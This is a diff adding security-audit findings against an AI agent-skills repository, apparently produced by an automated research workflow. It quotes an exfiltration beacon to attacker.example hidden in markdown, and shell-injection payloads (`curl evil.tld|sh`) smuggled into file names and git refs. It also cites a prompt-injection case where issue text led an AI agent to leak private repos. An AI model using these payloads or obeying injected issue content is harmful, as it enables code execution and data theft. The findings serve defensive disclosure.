@@ -1354,3 +1354,82 @@ location: .github/workflows/cut-release.yml:32-33 (permissions block), :109, :16
 `cut-release.yml` declares workflow-level `permissions: contents: write` (lines 32-33), granting the job's default ambient `GITHUB_TOKEN` write access to repository contents. Verified: every actual write operation in the job — the idempotency check `gh release view` (line 114) and the release creation `gh release create` (line 182) — explicitly sets `GH_TOKEN: ${{ steps.app-token.outputs.token }}` (lines 109, 169), overriding the ambient token with a freshly-minted, purpose-scoped GitHub App token for those calls. No step relies on the ambient `GITHUB_TOKEN` having write access: `actions/checkout` needs only read, and the CHANGELOG-parsing/version-detection steps need no write at all. The workflow-wide `contents: write` grant is therefore dead weight — unused by the job's own design, but still active as standing write access for the whole job's ambient token, needlessly increasing blast radius should any action in the job's dependency chain (e.g. `actions/checkout`, `actions/create-github-app-token`) ever be compromised. Least-privilege fix: drop the top-level grant to `contents: read` (or omit `permissions:` and rely on the org/repo default), since the App token already covers the one legitimate write path.
 
 ---
+
+## F-2026-07-08-001 — Contain excerpt-quoting in security-auditor's RED-verdict report_template to prevent public-issue exfiltration via rendered markdown
+
+```yaml
+id: F-2026-07-08-001
+discovered_at: 2026-07-08T11:00:00Z
+run_id: 28929145468
+target_repo: ievo-ai/skills
+title: Sanitize markdown image/link syntax in security-auditor's report_template excerpts before they reach a public GitHub issue in the candidate's own repo
+status: issued
+issue_url: https://github.com/ievo-ai/skills/issues/350
+effort: low
+scope: multi-file
+evidence:
+  - https://noma.security/blog/gitlost-how-we-tricked-githubs-ai-agent-into-leaking-private-repos/ (via news.ycombinator.com, 123 pts, 2026-07-08): documents untrusted GitHub Issue content manipulating an AI agent into publishing private data via its own comment tool — same vulnerability class as security-auditor's excerpt-into-public-issue flow
+  - plugins/ievo/agents/security-auditor.md: RED-verdict report_template embeds raw excerpts verbatim, no markdown-rendering sanitization instruction
+  - plugins/ievo/skills/init/references/security-report-flow.md: Step 2 already guards against shell-interpolation risk in excerpts but has no equivalent guard against markdown image/link rendering risk once posted publicly
+```
+
+`security-auditor.md`'s RED-verdict `report_template.body` quotes raw excerpts of adversarial scanned content verbatim, then `/ievo:init` Step 8b files that body as a **public GitHub issue in the candidate's own repo** via `gh issue create`. GitHub auto-renders markdown images/links in issue bodies — a crafted excerpt containing `![x](https://attacker.example/beacon.png?d=...)` would fire a live network request to attacker infrastructure the moment anyone views the issue, with no further agent action required. `security-report-flow.md` already has a "CRITICAL" callout guarding against shell-interpolation risk in excerpts (mandating the Write tool over `echo`) but no equivalent guard against this rendering-based exfiltration channel. Eva's own research workflow (`eva-research.yml` Step 3c.3) already codifies exactly this containment discipline for its own security-finding issues; the skills repo's structurally identical flow lacks it. Proposed fix: sanitize/fence markdown image and link syntax in excerpts destined for `report_template.body` (`agents/security-auditor.md`), and extend `security-report-flow.md`'s existing CRITICAL callout to cover this risk alongside the shell-interpolation one it already documents. Full proposal, acceptance criteria, and open questions: see issue body.
+
+---
+
+## S-2026-07-08-001 — Command injection via unsanitized file paths in security-check/SKILL.md's `gh api` Bash calls
+
+```yaml
+id: S-2026-07-08-001
+discovered_at: 2026-07-08T10:30:00Z
+run_id: 28929145468
+target_repo: ievo-ai/skills
+title: security-check/SKILL.md interpolates attacker-controlled file paths from the audited repo's own git tree directly into a double-quoted gh api Bash string, allowing command injection before any verdict is produced
+status: issued
+issue_url: https://github.com/ievo-ai/skills/issues/347
+cwe: CWE-78
+confidence: high
+location: plugins/ievo/skills/security-check/SKILL.md:87-97 (Step 1-2 antivirus deep scan file-fetch loop)
+```
+
+Step 2's `<full-file-path>` value (line 95-96) is sourced directly from Step 1's git-trees listing of the attacker-controlled candidate repo (line 90-92) and substituted unvalidated into `gh api "repos/<owner>/<repo>/contents/<full-file-path>?ref=<commit-sha>"`. Git tree entries permit almost any byte sequence in a path (only NUL and `/` are forbidden), so a file/directory name like `` `curl evil.tld|sh` `` survives into the double-quoted Bash string, where backtick/`$()` command substitution still applies. No validation, allowlist, or single-quoting exists anywhere in the file before this interpolation — the security gate meant to catch malicious candidates can be defeated by the candidate's own file naming, before any GREEN/YELLOW/RED verdict is produced. Full exploit chain, preconditions, and recommendation: see issue body.
+
+---
+
+## S-2026-07-08-002 — Command injection via unsanitized `<ref>`/`<path>` in inspect/SKILL.md's `gh api` Bash calls
+
+```yaml
+id: S-2026-07-08-002
+discovered_at: 2026-07-08T10:30:00Z
+run_id: 28929145468
+target_repo: ievo-ai/skills
+title: inspect/SKILL.md interpolates an unvalidated user/attacker-supplied git ref and repo-supplied file paths directly into double-quoted gh api Bash strings, allowing command injection during a skill explicitly designed to preview untrusted repos
+status: issued
+issue_url: https://github.com/ievo-ai/skills/issues/348
+cwe: CWE-78
+confidence: high
+location: plugins/ievo/skills/inspect/SKILL.md:61 (Step 2 tree fetch), 123,133,143 (Step 4 content fetches)
+```
+
+`/ievo:inspect <owner>/<repo>@<ref>` is explicitly designed for previewing *any* public repo before deciding whether to proceed further. `<ref>` (Step 2, line 61) and `<path>` values pulled from the target repo's own tree listing (Step 4, lines 123/133/143) are both interpolated into double-quoted `gh api "..."` strings with no format validation anywhere in the file. Git's `check-ref-format` rules permit backticks, `$`, `;`, `|`, and parentheses in ref names, so a branch like `` main`curl evil.tld|sh` `` is a legal git ref an attacker can push to their own repo — the embedded payload executes at shell-parse time, before `gh` runs. Same root cause and fix shape as S-2026-07-08-001 (security-check/SKILL.md), filed as a separate finding since it's a distinct skill/file. Full exploit chain, preconditions, and recommendation: see issue body.
+
+---
+
+## S-2026-07-08-003 — `/ievo:update` silently re-vendors from upstream with no re-audit gate, restoring executability of possibly-compromised content
+
+```yaml
+id: S-2026-07-08-003
+discovered_at: 2026-07-08T10:30:00Z
+run_id: 28929145468
+target_repo: ievo-ai/skills
+title: update.md refreshes vendored agent/skill content from upstream by source.repo/source.path with zero re-audit, and explicitly re-restores executable bits on fetched scripts, silently reintroducing content from a since-compromised upstream
+status: issued
+issue_url: https://github.com/ievo-ai/skills/issues/349
+cwe: CWE-829
+confidence: high
+location: plugins/ievo/commands/update.md:34-46 (Step 2 refresh-and-overwrite), :111-117 (Rules — explicit chmod +x restoration, "No Opus replay" design note)
+```
+
+`/ievo:init`'s install pipeline gates every vendored agent/skill behind a `security-auditor` scan at first install — a point-in-time trust decision. If the same upstream `source.repo`/`source.path` is later compromised (maintainer account takeover, malicious commit merged into an otherwise-trusted repo — a threat class `security-auditor.md` itself names), `/ievo:update`'s Step 2 re-fetches and overwrites the local copy with **no diff shown, no re-dispatch of security-auditor, no confirmation gate of any kind**, then Step 3 re-injects the trust-signaling overlay marker into the new content, and the file's own Rules section (line 117) explicitly instructs restoring `chmod +x` on any newly-fetched `.sh`/`.py` scripts. The design is stated plainly at line 114: "No Opus replay... Refresh-from-upstream is just file copy + marker re-injection" — confirming no compensating re-audit exists. Full exploit chain, preconditions, and recommendation: see issue body.
+
+---
